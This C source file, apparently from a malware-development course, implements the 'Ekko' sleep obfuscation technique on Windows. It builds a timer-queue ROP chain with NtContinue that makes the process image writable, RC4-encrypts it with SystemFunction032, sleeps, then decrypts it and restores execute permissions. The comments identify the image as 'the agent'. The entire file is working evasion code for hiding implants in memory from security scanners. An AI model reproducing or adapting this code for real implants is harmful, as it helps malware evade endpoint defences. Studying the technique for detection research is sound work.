// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include "Ekko.h"

// Status code and macro to check for success
#define STATUS_SUCCESS          0x00000000
#define NT_SUCCESS(STATUS)      ((NTSTATUS)(STATUS) >= 0)
// Macro to cast to UINT_PTR
#define U_PTR(x) (UINT_PTR)x


// Initialize the Win32 API function pointers
BOOL InitializeWinApi32(OUT PWIN32_API pWin32Apis) {
    HMODULE hNtdll = NULL;

    // Get handle to ntdll.dll
    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
        printf("[!] GetModuleHandleA Failed with Error: %ld\n", GetLastError());
        return FALSE;
    }

    // Assign function pointers to struct members
    pWin32Apis->RtlDeleteTimerQueue = GetProcAddress(hNtdll, "RtlDeleteTimerQueue");
    pWin32Apis->RtlRegisterWait = GetProcAddress(hNtdll, "RtlRegisterWait");
    pWin32Apis->RtlCreateTimer = GetProcAddress(hNtdll, "RtlCreateTimer");
    pWin32Apis->RtlCreateTimerQueue = GetProcAddress(hNtdll, "RtlCreateTimerQueue");
    pWin32Apis->NtCreateEvent = GetProcAddress(hNtdll, "NtCreateEvent");
    pWin32Apis->NtWaitForSingleObject = GetProcAddress(hNtdll, "NtWaitForSingleObject");
    pWin32Apis->NtSignalAndWaitForSingleObject = GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
    pWin32Apis->NtContinue = GetProcAddress(hNtdll, "NtContinue");
    pWin32Apis->SystemFunction032 = GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    return TRUE;
}

// Generate a random 32-bit seed value for creating a unique key to encrypt the specified memory
ULONG Random32() {
    UINT32 Seed = 0;

    // Generate random 32-bit value using rdrand instruction
    _rdrand32_step(&Seed);

    return Seed;
}

// Function to obfuscate memory and delay execution using timers
VOID EkkoObf(IN PWIN32_API pWin32Apis, IN DWORD dwTimeOut) {
    NTSTATUS Status = STATUS_SUCCESS;
    STRING Key = { 0 };
    STRING Img = { 0 };
    BYTE Rnd[16] = { 0 };
    CONTEXT Ctx[7] = { 0 };
    CONTEXT CtxInit = { 0 };
    HANDLE EvntTimer = NULL;
    HANDLE EvntStart = NULL;
    HANDLE EvntEnd = NULL;
    HANDLE Queue = NULL;
    HANDLE Timer = NULL;
    DWORD Delay = 0;
    DWORD Value = 0;

    // Get handle of the current process and parse PE header to get more information
    PVOID ImageBase = GetModuleHandleA(NULL);
    ULONG ImageSize = ((PIMAGE_NT_HEADERS)(U_PTR(ImageBase) + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

    printf("[+] Starting Ekko Sleep Obfuscation\n");
    printf("[+] Image 0x%p [%ld bytes]\n", ImageBase, ImageSize);

    // Generate a new key
    for (int i = 0; i < 16; i++) {
        Rnd[i] = (BYTE)Random32();
    }

    // Set key buffer and size
    Key.Buffer = (PCHAR)Rnd;
    Key.Length = sizeof(Rnd);

    // Set image pointer and size
    Img.Buffer = ImageBase; // Address of the agent
    Img.Length = ImageSize; // Size of agent memory

    // Create a timer queue
    if (!NT_SUCCESS(pWin32Apis->RtlCreateTimerQueue(&Queue))) {
        goto LEAVE;
    }

    // Create events for starting the ROP chain and waiting for the ROP chain to finish
    if (!NT_SUCCESS(Status = pWin32Apis->NtCreateEvent(&EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) ||
        !NT_SUCCESS(Status = pWin32Apis->NtCreateEvent(&EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE)) ||
        !NT_SUCCESS(Status = pWin32Apis->NtCreateEvent(&EvntEnd, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE))) {
        printf("[!] NtCreateEvent Failed with Error: %lx\n", Status);
        goto LEAVE;
    }

    // Start the ROP part of this operation/sleep obfuscation
    if (NT_SUCCESS(Status = pWin32Apis->RtlCreateTimer(Queue, &Timer, RtlCaptureContext, &CtxInit, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD))) {
        // Wait until we successfully finished calling RtlCaptureContext
        if (NT_SUCCESS(Status = pWin32Apis->RtlCreateTimer(Queue, &Timer, SetEvent, EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD))) {
            // Wait until we successfully retrieved the timer's thread context
            if (!NT_SUCCESS(Status = pWin32Apis->NtWaitForSingleObject(EvntTimer, FALSE, FALSE))) {
                printf("[!] NtWaitForSingleObject Failed with Error: %lx\n", Status);
                goto LEAVE;
            }

            // At this point we can start preparing the contexts and execute the timers
            for (int i = 0; i < 7; i++) {
                memcpy(&Ctx[i], &CtxInit, sizeof(CONTEXT));
                Ctx[i].Rsp -= sizeof(PVOID);
            }

            // Start of ROP chain
            Ctx[0].Rip = U_PTR(WaitForSingleObjectEx);
            Ctx[0].Rcx = U_PTR(EvntStart);
            Ctx[0].Rdx = U_PTR(INFINITE);
            Ctx[0].R8 = U_PTR(NULL);

            // Protect
            Ctx[1].Rip = U_PTR(VirtualProtect);
            Ctx[1].Rcx = U_PTR(ImageBase);
            Ctx[1].Rdx = U_PTR(ImageSize);
            Ctx[1].R8 = U_PTR(PAGE_READWRITE);
            Ctx[1].R9 = U_PTR(&Value);

            // Encrypt image base address
            Ctx[2].Rip = U_PTR(pWin32Apis->SystemFunction032);
            Ctx[2].Rcx = U_PTR(&Img);
            Ctx[2].Rdx = U_PTR(&Key);

            // Sleep
            Ctx[3].Rip = U_PTR(WaitForSingleObjectEx);
            Ctx[3].Rcx = U_PTR(GetCurrentProcess());
            Ctx[3].Rdx = U_PTR(dwTimeOut);
            Ctx[3].R8 = U_PTR(FALSE);

            // Decrypt image base address
            Ctx[4].Rip = U_PTR(pWin32Apis->SystemFunction032);
            Ctx[4].Rcx = U_PTR(&Img);
            Ctx[4].Rdx = U_PTR(&Key);

            // Protect
            Ctx[5].Rip = U_PTR(VirtualProtect);
            Ctx[5].Rcx = U_PTR(ImageBase);
            Ctx[5].Rdx = U_PTR(ImageSize);
            Ctx[5].R8 = U_PTR(PAGE_EXECUTE_READ);
            Ctx[5].R9 = U_PTR(&Value);

            // End of ROP chain
            Ctx[6].Rip = U_PTR(SetEvent);
            Ctx[6].Rcx = U_PTR(EvntEnd);

            printf("[*] Queue sleep obfuscation chain\n");

            // Execute timers
            for (int i = 0; i < 7; i++) {
                if (!NT_SUCCESS(Status = pWin32Apis->RtlCreateTimer(Queue, &Timer, pWin32Apis->NtContinue, &Ctx[i], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD))) {
                    printf("[!] RtlCreateTimer Failed with Error: %lx\n", Status);
                    goto LEAVE;
                }
            }

            printf("[*] Trigger sleep obfuscation chain\n");

            // Trigger/start the ROP chain and wait for it to end
            if (!NT_SUCCESS(Status = pWin32Apis->NtSignalAndWaitForSingleObject(EvntStart, EvntEnd, FALSE, NULL))) {
                printf("[!] NtSignalAndWaitForSingleObject Failed with Error: %lx\n", Status);
                goto LEAVE;
            }
        } else {
            printf("[!] RtlRegisterWait Failed with Error: %lx\n", Status);
        }
    } else {
        printf("[!] RtlRegisterWait Failed with Error: %lx\n", Status);
    }

    printf("[*] Ending the obfuscation chain\n\n");

    LEAVE:
    // Cleanup
    if (Queue) {
        pWin32Apis->RtlDeleteTimerQueue(Queue);
        Queue = NULL;
    }
    if (EvntTimer) {
        CloseHandle(EvntTimer);
        EvntTimer = NULL;
    }
    if (EvntStart) {
        CloseHandle(EvntStart);
        EvntStart = NULL;
    }
    if (EvntEnd) {
        CloseHandle(EvntEnd);
        EvntEnd = NULL;
    }
}

// Main function to demonstrate Ekko Sleep Obfuscation Technique
int main() {
    WIN32_API Win32Api = { 0 };
    UINT dwDelay = 5 * 1000; // 5 seconds delay

    printf("[*] Using the Ekko Sleep Obfuscation Technique ... \n\n");

    if (!InitializeWinApi32(&Win32Api)) {
        puts("[-] Failed to initialize Win32 API");
        return -1;
    }

    while (TRUE) {
        EkkoObf(&Win32Api, dwDelay);
    }

    return 0;
}
